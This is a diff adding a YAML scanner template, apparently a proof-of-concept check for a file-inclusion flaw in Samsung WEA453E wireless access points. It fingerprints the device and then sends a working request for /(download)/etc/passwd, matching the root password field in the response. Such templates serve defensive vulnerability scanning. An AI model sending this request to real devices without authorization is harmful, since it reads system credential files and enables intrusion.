@@ -1,0 +1,26 @@
+name: yaml-poc-samsung-wea453e_firmware-file_inclusion-CT-530865
+binding: 45781978-dcb4-4005-a16d-f1ff184b1fa5
+detail:
+    author: system_user
+    links:
+        - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+        - https://www.seebug.org/vuldb/ssvid-99075
+    vulnerability:
+        id: 77f713b2-d55d-471f-9311-12f4b358e310
+        level: critical
+    warning: Harmless
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /
+        expression: response.status == 200 && response.body.bcontains(bytes("Samsung WLAN AP"))
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /(download)/etc/passwd
+        expression: response.status == 200 && response.content_type.icontains("application/octet-stream") && "root:(?P<passwd>.+?):0:0:0:/root:/bin/bash".bmatches(response.body)
+expression: r0() && r1()
